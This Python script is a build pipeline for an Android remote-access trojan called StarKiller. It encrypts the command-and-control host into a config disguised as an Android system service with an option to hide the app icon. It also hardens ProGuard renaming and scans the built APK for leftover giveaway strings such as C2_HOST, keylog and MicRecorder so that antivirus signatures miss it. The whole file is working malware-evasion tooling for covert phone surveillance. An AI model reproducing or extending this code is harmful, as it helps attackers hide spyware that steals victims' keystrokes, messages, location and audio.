"""
StarKiller Obfuscation Pipeline

1. String encryption — encrypt all config strings so they don't appear in plaintext in the DEX
2. ProGuard hardening — aggressive class/method renaming
3. Manifest cleaning — remove debug flags, sanitize package names
4. YARA signature check — scan for known RAT detection patterns (including DEX string tables)
"""
import base64
import os
import re
import sys
import zipfile

KEY = 0x5A

def encrypt_string(plain):
    raw = plain.encode("utf-8")
    out = bytearray(len(raw))
    for i in range(len(raw)):
        out[i] = raw[i] ^ (KEY + i % 7)
    return base64.b64encode(bytes(out)).decode("ascii")


def decrypt_string(encoded):
    raw = base64.b64decode(encoded)
    out = bytearray(len(raw))
    for i in range(len(raw)):
        out[i] = raw[i] ^ (KEY + i % 7)
    return bytes(out).decode("utf-8")


def generate_encrypted_config(host, port, app_name, hide_icon):
    enc_host = encrypt_string(host)
    enc_name = encrypt_string(app_name)

    verify_host = decrypt_string(enc_host)
    verify_name = decrypt_string(enc_name)
    assert verify_host == host, f"Encryption verify failed: {verify_host} != {host}"
    assert verify_name == app_name, f"Encryption verify failed: {verify_name} != {app_name}"

    config = f'''package com.android.internal.svc

object Config {{
    val SYNC_HOST: String get() = Crypt.d("{enc_host}")
    const val SYNC_PORT = {port}
    const val RECONNECT_BASE_MS = 5000L
    const val RECONNECT_MAX_MS = 300000L
    const val HEARTBEAT_INTERVAL_MS = 30000L
    val APP_NAME: String get() = Crypt.d("{enc_name}")
    const val HIDE_ICON = {str(hide_icon).lower()}
}}
'''
    return config


def generate_proguard_rules():
    return """-optimizationpasses 5
-allowaccessmodification
-mergeinterfacesaggressively
-overloadaggressively
-repackageclasses ''
-flattenpackagehierarchy ''
-renamesourcefileattribute ''

-keep public class com.android.internal.svc.MainActivity { *; }
-keep public class com.android.internal.svc.SyncService { *; }
-keep public class com.android.internal.svc.GrantActivity { *; }
-keep public class com.android.internal.svc.persistence.StartReceiver { *; }
-keep public class com.android.internal.svc.modules.InputService { *; }
-keep public class com.android.internal.svc.modules.AlertService { *; }

-dontwarn javax.**
-dontwarn sun.**
-dontwarn kotlin.**
-dontwarn kotlinx.**

-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}

-assumenosideeffects class kotlin.jvm.internal.Intrinsics {
    public static void checkNotNullParameter(...);
    public static void checkNotNullExpressionValue(...);
    public static void checkNotNull(...);
}

-adaptclassstrings
-adaptresourcefilenames
-adaptresourcefilecontents
"""


def extract_dex_strings(filepath):
    """Extract printable strings from all DEX files inside an APK."""
    strings = []
    try:
        with zipfile.ZipFile(filepath) as z:
            for name in z.namelist():
                if name.endswith('.dex'):
                    data = z.read(name)
                    found = re.findall(rb'[\x20-\x7e]{4,}', data)
                    strings.extend(s.decode('ascii', errors='replace') for s in found)
    except (zipfile.BadZipFile, FileNotFoundError):
        pass
    return strings


def scan_file_for_signatures(filepath):
    if not os.path.exists(filepath):
        return []

    with open(filepath, "rb") as f:
        data = f.read()

    findings = []

    dex_strings = extract_dex_strings(filepath) if filepath.endswith('.apk') else []

    rat_strings = [
        (b"C2_HOST", "Config string 'C2_HOST' visible"),
        (b"C2_PORT", "Config string 'C2_PORT' visible"),
        (b"starkiller", "Project name 'starkiller' visible"),
        (b"StarKiller", "Project name 'StarKiller' visible"),
        (b"keylog", "Keyword 'keylog' visible"),
        (b"KeyLog", "Class name 'KeyLog' visible"),
        (b"GpsTracker", "Class name 'GpsTracker' visible"),
        (b"MicRecorder", "Class name 'MicRecorder' visible"),
        (b"ScreenCapture", "Class name 'ScreenCapture' visible"),
        (b"SmsModule", "Class name 'SmsModule' visible"),
        (b"NetClient", "Class name 'NetClient' visible"),
        (b"BootReceiver", "Class name 'BootReceiver' visible"),
        (b"agent_id", "Protocol keyword 'agent_id' visible"),
        (b"task_router", "Class name 'task_router' visible"),
        (b"vader", "VADER reference visible"),
    ]

    for sig, desc in rat_strings:
        if sig in data:
            offset = data.index(sig)
            findings.append({"sig": sig.decode(errors="replace"), "desc": f"[BINARY] {desc}", "offset": offset, "severity": "HIGH"})

    if dex_strings:
        dex_sigs = ["C2_HOST", "C2_PORT", "starkiller", "StarKiller", "keylog",
                    "KeyLog", "GpsTracker", "MicRecorder", "ScreenCapture",
                    "SmsModule", "NetClient", "BootReceiver", "agent_id", "vader"]
        for ds in dex_strings:
            for sig in dex_sigs:
                if sig.lower() in ds.lower() and 'OnBackPressedDispatcher' not in ds and 'Landroid/' not in ds:
                    findings.append({"sig": sig, "desc": f"[DEX] '{sig}' in DEX string: {ds[:80]}", "severity": "HIGH"})
                    break

    ip_pattern = re.compile(rb'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    ips = ip_pattern.findall(data)
    private_ips = [ip for ip in ips if ip.startswith(b"192.168.") or ip.startswith(b"10.") or ip.startswith(b"172.")]
    if private_ips:
        findings.append({"sig": "hardcoded_ip", "desc": f"Hardcoded private IP(s): {[ip.decode() for ip in private_ips[:3]]}", "severity": "HIGH"})

    perm_count = 0
    dangerous_perms = [b"READ_SMS", b"SEND_SMS", b"CAMERA", b"RECORD_AUDIO",
                       b"READ_CONTACTS", b"ACCESS_FINE_LOCATION", b"READ_CALL_LOG"]
    for p in dangerous_perms:
        if p in data:
            perm_count += 1
    if perm_count >= 5:
        findings.append({"sig": "excessive_perms", "desc": f"{perm_count}/7 dangerous permissions requested", "severity": "HIGH"})

    if b"BIND_ACCESSIBILITY_SERVICE" in data and b"BIND_NOTIFICATION_LISTENER_SERVICE" in data:
        findings.append({"sig": "dual_service_abuse", "desc": "Both Accessibility + NotificationListener (common RAT pattern)", "severity": "HIGH"})

    return findings


def scan_directory(path):
    all_findings = {}
    for root, dirs, files in os.walk(path):
        for fname in files:
            fpath = os.path.join(root, fname)
            findings = scan_file_for_signatures(fpath)
            if findings:
                rel = os.path.relpath(fpath, path)
                all_findings[rel] = findings
    return all_findings


def print_scan_report(findings, title="DETECTION SCAN"):
    print(f"\n  {'='*60}")
    print(f"  {title}")
    print(f"  {'='*60}")

    if not findings:
        print(f"  [+] CLEAN — no known signatures detected")
        print(f"  {'='*60}\n")
        return 0

    total = sum(len(v) for v in findings.values())
    high = sum(1 for v in findings.values() for f in v if f["severity"] == "HIGH")
    med = sum(1 for v in findings.values() for f in v if f["severity"] == "MEDIUM")

    for filepath, file_findings in sorted(findings.items()):
        print(f"\n  [{filepath}]")
        for f in file_findings:
            icon = "!!" if f["severity"] == "HIGH" else "! "
            print(f"    [{icon}] {f['desc']}")
            if "offset" in f:
                print(f"         offset: 0x{f['offset']:x}")

    print(f"\n  TOTAL: {total} findings ({high} HIGH, {med} MEDIUM)")
    print(f"  {'='*60}\n")
    return total


def main():
    import argparse
    parser = argparse.ArgumentParser(description="StarKiller obfuscation pipeline")
    sub = parser.add_subparsers(dest="cmd")

    enc = sub.add_parser("encrypt", help="Encrypt a string")
    enc.add_argument("text")

    dec = sub.add_parser("decrypt", help="Decrypt a string")
    dec.add_argument("encoded")

    cfg = sub.add_parser("config", help="Generate encrypted Config.kt")
    cfg.add_argument("--ip", required=True)
    cfg.add_argument("--port", type=int, default=8667)
    cfg.add_argument("--name", default="System Service")
    cfg.add_argument("--hide-icon", action="store_true")

    pro = sub.add_parser("proguard", help="Generate hardened ProGuard rules")

    scn = sub.add_parser("scan", help="Scan files for detection signatures")
    scn.add_argument("path", help="File or directory to scan")

    args = parser.parse_args()

    if args.cmd == "encrypt":
        result = encrypt_string(args.text)
        print(f"  plain:     {args.text}")
        print(f"  encrypted: {result}")
        print(f"  verify:    {decrypt_string(result)}")

    elif args.cmd == "decrypt":
        print(f"  decrypted: {decrypt_string(args.encoded)}")

    elif args.cmd == "config":
        config = generate_encrypted_config(args.ip, args.port, args.name, args.hide_icon)
        config_path = os.path.join("client", "app", "src", "main", "kotlin",
                                   "com", "android", "internal", "svc", "Config.kt")
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        with open(config_path, "w") as f:
            f.write(config)
        print(f"  [+] Encrypted config written to {config_path}")

    elif args.cmd == "proguard":
        rules = generate_proguard_rules()
        rules_path = os.path.join("client", "app", "proguard-rules.pro")
        with open(rules_path, "w") as f:
            f.write(rules)
        print(f"  [+] Hardened ProGuard rules written to {rules_path}")

    elif args.cmd == "scan":
        if os.path.isdir(args.path):
            findings = scan_directory(args.path)
        else:
            findings = {}
            f = scan_file_for_signatures(args.path)
            if f:
                findings[args.path] = f
        print_scan_report(findings)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
